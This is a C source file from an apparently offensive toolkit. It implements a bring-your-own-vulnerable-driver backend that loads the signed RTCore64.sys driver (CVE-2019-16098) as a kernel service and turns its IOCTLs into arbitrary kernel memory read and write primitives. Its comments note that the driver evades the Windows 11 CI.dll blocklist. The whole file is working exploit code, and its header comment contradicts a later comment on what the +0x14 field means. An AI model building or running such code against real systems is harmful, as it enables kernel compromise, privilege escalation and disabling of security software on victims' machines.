/*
 * backend_rtcore64.c -- JOCKY BYOVD: RTCore64.sys backend
 * byovd/kernel_subverter/backend_rtcore64.c
 *
 * Windows x64 | MinGW/Clang | ring-3
 *
 * Implements byovd_ops_t for RTCore64.sys (MSI Afterburner <= 4.6.4.16117).
 * CVE-2019-16098 -- arbitrary kernel memory R/W via DeviceIoControl.
 *
 * IOCTL PROTOCOL
 * --------------
 * Device:  \\.\RTCore64
 * Service: RTCore64
 *
 * Buffer layout (RTCORE64_MEM_OP) -- exactly 32 bytes (0x20):
 *   +0x00  BYTE[8]  Padding  must be 0
 *   +0x08  ULONG64  Address  kernel VA
 *   +0x10  ULONG    Pad2     must be 0
 *   +0x14  ULONG    Size     1 / 2 / 4   (8 NOT supported -- use two 4-byte ops)
 *   +0x18  ULONG    Value    output (read) / input (write)
 *   +0x1C  ULONG    Pad3     must be 0
 *
 * Read:  IOCTL 0x80002048  in=op, out=op  driver writes Value on return
 * Write: IOCTL 0x8000204C  in=op, out=op  driver reads Value and writes to Address
 *
 * CONSTRAINTS
 * -----------
 *   Max 4 bytes per IOCTL call -- 8-byte ops issue two 4-byte IOCTLs
 *   Driver takes kernel VA directly -- no physical address needed
 *   Not on Windows 11 24H2 CI.dll compiled-in blocklist (confirmed 2026-09)
 *   Does NOT survive HVCI -- requires VBS/HVCI disabled
 *   Address must be valid mapped kernel VA -- invalid VA = BSOD
 *
 * NT PATH FIX
 * -----------
 * StartService uses \??\ prefix for reliable path resolution.
 * Without it, some Win11 24H2 configurations fail with ERROR_FILE_NOT_FOUND
 * even when the file exists at the Win32 path.
 */

#include "byovd_interface.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ============================================================
   CONSTANTS
   ============================================================ */

#define RTCORE64_SVC_NAME    "RTCore64"
#define RTCORE64_DEVICE      "\\\\.\\RTCore64"
#define RTCORE64_IOCTL_READ  0x80002048UL
#define RTCORE64_IOCTL_WRITE 0x8000204CUL

/* ============================================================
   IOCTL BUFFER STRUCTURE -- must be exactly 32 bytes
   ============================================================ */

/*
 * CRITICAL: the field at +0x14 is NOT a transfer size.
 * It is an OFFSET added to Address before the dereference:
 *   driver reads  *(DWORD*)(Address + Offset)
 *   driver writes *(DWORD*)(Address + Offset) = Value
 * The driver ALWAYS transfers exactly one DWORD regardless.
 *
 * Setting Offset=4 (the old "Size=4") caused the driver to read
 * Address+4 instead of Address, failing validation on kernel VAs
 * and returning ERROR_INVALID_PARAMETER (87).
 *
 * Fix: always set Offset=0. To read VA+4, pass Address=VA+4, Offset=0.
 */
#pragma pack(push, 1)
typedef struct {
    BYTE    Padding[8];  /* +0x00  zeroed                         */
    ULONG64 Address;     /* +0x08  kernel virtual address (base)  */
    ULONG   Pad2;        /* +0x10  zeroed                         */
    ULONG   Offset;      /* +0x14  byte offset from Address -- set 0, vary Address instead */
    ULONG   Value;       /* +0x18  read result / write data       */
    ULONG   Pad3;        /* +0x1C  zeroed                         */
} RTCORE64_MEM_OP;       /* = 0x20 = 32 bytes                     */
#pragma pack(pop)

_Static_assert(sizeof(RTCORE64_MEM_OP) == 0x20,
               "RTCORE64_MEM_OP must be 32 bytes");

/* ============================================================
   PRIVATE CONTEXT (stored in backend->private_ctx)
   ============================================================ */

typedef struct {
    ULONG read_ioctl;
    ULONG write_ioctl;
} rtcore64_ctx_t;

/* ============================================================
   INTERNAL HELPERS
   ============================================================ */

/*
 * _ioctl_read4 -- raw 4-byte kernel VA read via RTCore64 IOCTL.
 * Called only from rtcore64_read -- do not call directly.
 */
static byovd_result_t _ioctl_read4(HANDLE dev, uintptr_t addr, ULONG *out)
{
    RTCORE64_MEM_OP op;
    ZeroMemory(&op, sizeof(op));
    op.Address = (ULONG64)addr;
    op.Offset  = 0;    /* driver reads *(DWORD*)(Address + Offset) -- keep Offset=0 */

    DWORD ret = 0;
    if (!DeviceIoControl(dev, RTCORE64_IOCTL_READ,
                         &op, sizeof(op),
                         &op, sizeof(op),
                         &ret, NULL))
    {
        return BYOVD_ERR_READ;
    }

    *out = op.Value;
    return BYOVD_OK;
}

/*
 * _ioctl_write4 -- raw 4-byte kernel VA write via RTCore64 IOCTL.
 */
static byovd_result_t _ioctl_write4(HANDLE dev, uintptr_t addr, ULONG val)
{
    RTCORE64_MEM_OP op;
    ZeroMemory(&op, sizeof(op));
    op.Address = (ULONG64)addr;
    op.Offset  = 0;    /* driver writes *(DWORD*)(Address + Offset) = Value */
    op.Value   = val;

    DWORD ret = 0;
    if (!DeviceIoControl(dev, RTCORE64_IOCTL_WRITE,
                         &op, sizeof(op),
                         &op, sizeof(op),
                         &ret, NULL))
    {
        return BYOVD_ERR_WRITE;
    }

    return BYOVD_OK;
}

/* ============================================================
   VTABLE IMPLEMENTATIONS
   ============================================================ */

static byovd_result_t rtcore64_load(byovd_backend_t *self)
{
    /* build NT namespace path: \??\D:\...\RTCore64.sys */
    char nt_path[MAX_PATH + 8] = {0};
    snprintf(nt_path, sizeof(nt_path) - 1, "\\??\\%s", self->driver_path);

    printf("[rtcore64] loading: %s\n", self->driver_path);
    printf("[rtcore64] NT path: %s\n", nt_path);

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[rtcore64] OpenSCManager failed: %lu\n", GetLastError());
        return BYOVD_ERR_LOAD;
    }

    /* aggressive stale cleanup -- loop up to 3 times */
    for (int attempt = 0; attempt < 3; attempt++) {
        SC_HANDLE hStale = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
        if (!hStale) break;

        /* log what path the stale registration had */
        DWORD cfg_sz = 0;
        QueryServiceConfigA(hStale, NULL, 0, &cfg_sz);
        if (cfg_sz) {
            QUERY_SERVICE_CONFIGA *cfg =
                (QUERY_SERVICE_CONFIGA *)malloc(cfg_sz);
            if (cfg && QueryServiceConfigA(hStale, cfg, cfg_sz, &cfg_sz)) {
                printf("[rtcore64] stale service path: %s\n",
                       cfg->lpBinaryPathName);
            }
            free(cfg);
        }

        SERVICE_STATUS ss = {0};
        ControlService(hStale, SERVICE_CONTROL_STOP, &ss);
        Sleep(400);
        BOOL del = DeleteService(hStale);
        CloseServiceHandle(hStale);

        if (del) {
            printf("[rtcore64] stale service removed (attempt %d)\n",
                   attempt + 1);
            Sleep(400);
            break;
        }
        Sleep(600);
    }

    SC_HANDLE hSvc = CreateServiceA(
        hScm,
        self->svc_name,
        self->svc_name,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        nt_path,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        DWORD err = GetLastError();
        printf("[rtcore64] CreateService failed: %lu", err);
        if (err == ERROR_SERVICE_EXISTS)
            printf(" (service already exists -- run sc.exe delete RTCore64 manually)");
        printf("\n");
        CloseServiceHandle(hScm);
        return BYOVD_ERR_LOAD;
    }

    printf("[rtcore64] service created -- calling StartService\n");

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[rtcore64] already running -- continuing\n");
        } else {
            printf("[rtcore64] StartService failed: %lu", err);
            switch (err) {
                case 2:    printf(" (ERROR_FILE_NOT_FOUND -- path bad or sig rejected)"); break;
                case 5:    printf(" (ERROR_ACCESS_DENIED  -- sig check failed / HVCI on)"); break;
                case 1275: printf(" (ERROR_DRIVER_BLOCKED -- CI.dll blocklist)");          break;
                case 577:  printf(" (ERROR_INVALID_IMAGE_HASH -- Authenticode invalid)");  break;
            }
            printf("\n");
            printf("[rtcore64] registered path: %s\n", nt_path);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            return BYOVD_ERR_LOAD;
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Sleep(400);
    printf("[rtcore64] driver loaded\n");
    return BYOVD_OK;
}

static byovd_result_t rtcore64_open(byovd_backend_t *self)
{
    self->device = CreateFileA(
        self->device_path,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (self->device == INVALID_HANDLE_VALUE) {
        printf("[rtcore64] CreateFile(%s) failed: %lu\n",
               self->device_path, GetLastError());
        return BYOVD_ERR_OPEN;
    }

    printf("[rtcore64] device handle: %p\n", (void *)self->device);
    return BYOVD_OK;
}

static void rtcore64_close(byovd_backend_t *self)
{
    if (self->device != INVALID_HANDLE_VALUE) {
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
    }
}

static byovd_result_t rtcore64_unload(byovd_backend_t *self)
{
    rtcore64_close(self);

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return BYOVD_ERR_UNLOAD;

    SC_HANDLE hSvc = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
    byovd_result_t r = BYOVD_ERR_UNLOAD;
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        if (DeleteService(hSvc)) r = BYOVD_OK;
        CloseServiceHandle(hSvc);
        printf("[rtcore64] driver unloaded\n");
    }

    CloseServiceHandle(hScm);
    return r;
}

/*
 * rtcore64_read -- read 1, 2, 4, or 8 bytes from kernel VA addr.
 * 8-byte reads issue two 4-byte IOCTLs (lo DWORD first, then hi DWORD).
 * Smaller reads (1, 2) read 4 bytes and mask the result.
 */
static byovd_result_t rtcore64_read(byovd_backend_t *self,
                                     uintptr_t        addr,
                                     void            *buf,
                                     size_t           size)
{
    HANDLE dev = self->device;
    byovd_result_t r;

    if (size <= 4) {
        ULONG val = 0;
        r = _ioctl_read4(dev, addr, &val);
        if (r != BYOVD_OK) {
            printf("[rtcore64] read%zu(0x%016llX) failed: %lu\n",
                   size, (unsigned long long)addr, GetLastError());
            return r;
        }
        memcpy(buf, &val, size);
        return BYOVD_OK;
    }

    /* size == 8: two 4-byte reads */
    ULONG lo = 0, hi = 0;
    r = _ioctl_read4(dev, addr,     &lo);
    if (r != BYOVD_OK) {
        printf("[rtcore64] read8 lo(0x%016llX) failed: %lu\n",
               (unsigned long long)addr, GetLastError());
        return r;
    }
    r = _ioctl_read4(dev, addr + 4, &hi);
    if (r != BYOVD_OK) {
        printf("[rtcore64] read8 hi(0x%016llX) failed: %lu\n",
               (unsigned long long)(addr + 4), GetLastError());
        return r;
    }

    uint64_t val64 = ((uint64_t)hi << 32) | (uint64_t)lo;
    memcpy(buf, &val64, 8);
    return BYOVD_OK;
}

/*
 * rtcore64_write -- write 1, 2, 4, or 8 bytes to kernel VA addr.
 */
static byovd_result_t rtcore64_write(byovd_backend_t *self,
                                      uintptr_t        addr,
                                      const void      *buf,
                                      size_t           size)
{
    HANDLE dev = self->device;
    byovd_result_t r;

    if (size <= 4) {
        ULONG val = 0;
        memcpy(&val, buf, size);
        r = _ioctl_write4(dev, addr, val);
        if (r != BYOVD_OK) {
            printf("[rtcore64] write%zu(0x%016llX) failed: %lu\n",
                   size, (unsigned long long)addr, GetLastError());
        }
        return r;
    }

    /* size == 8: two 4-byte writes */
    uint64_t val64 = 0;
    memcpy(&val64, buf, 8);

    r = _ioctl_write4(dev, addr,     (ULONG)( val64        & 0xFFFFFFFF));
    if (r != BYOVD_OK) {
        printf("[rtcore64] write8 lo(0x%016llX) failed: %lu\n",
               (unsigned long long)addr, GetLastError());
        return r;
    }
    r = _ioctl_write4(dev, addr + 4, (ULONG)((val64 >> 32) & 0xFFFFFFFF));
    if (r != BYOVD_OK) {
        printf("[rtcore64] write8 hi(0x%016llX) failed: %lu\n",
               (unsigned long long)(addr + 4), GetLastError());
    }
    return r;
}

/* ============================================================
   PUBLIC: BACKEND INIT
   ============================================================ */

/*
 * rtcore64_backend_init -- allocate and wire a byovd_backend_t for RTCore64.
 * driver_path: absolute or relative path to RTCore64.sys on disk.
 * Returns: heap-allocated backend on success, NULL on alloc failure.
 * Call byovd_engine_init(backend) after this to load + open the driver.
 */
byovd_backend_t *rtcore64_backend_init(const char *driver_path)
{
    byovd_backend_t *b = (byovd_backend_t *)calloc(1, sizeof(byovd_backend_t));
    if (!b) return NULL;

    rtcore64_ctx_t *ctx = (rtcore64_ctx_t *)calloc(1, sizeof(rtcore64_ctx_t));
    if (!ctx) { free(b); return NULL; }

    ctx->read_ioctl  = RTCORE64_IOCTL_READ;
    ctx->write_ioctl = RTCORE64_IOCTL_WRITE;

    b->name        = "RTCore64";
    b->device      = INVALID_HANDLE_VALUE;
    b->private_ctx = ctx;

    /* fill string fields */
    strncpy(b->svc_name,    RTCORE64_SVC_NAME, sizeof(b->svc_name)    - 1);
    strncpy(b->device_path, RTCORE64_DEVICE,   sizeof(b->device_path) - 1);

    /* resolve absolute path */
    if (!GetFullPathNameA(driver_path, MAX_PATH, b->driver_path, NULL)) {
        printf("[rtcore64] GetFullPathNameA failed: %lu\n", GetLastError());
        free(ctx); free(b);
        return NULL;
    }
    if (GetFileAttributesA(b->driver_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[rtcore64] driver not found: %s\n", b->driver_path);
        free(ctx); free(b);
        return NULL;
    }

    /* wire vtable */
    b->ops.load   = rtcore64_load;
    b->ops.open   = rtcore64_open;
    b->ops.close  = rtcore64_close;
    b->ops.unload = rtcore64_unload;
    b->ops.read   = rtcore64_read;
    b->ops.write  = rtcore64_write;

    printf("[rtcore64] backend initialised -- driver: %s\n", b->driver_path);
    return b;
}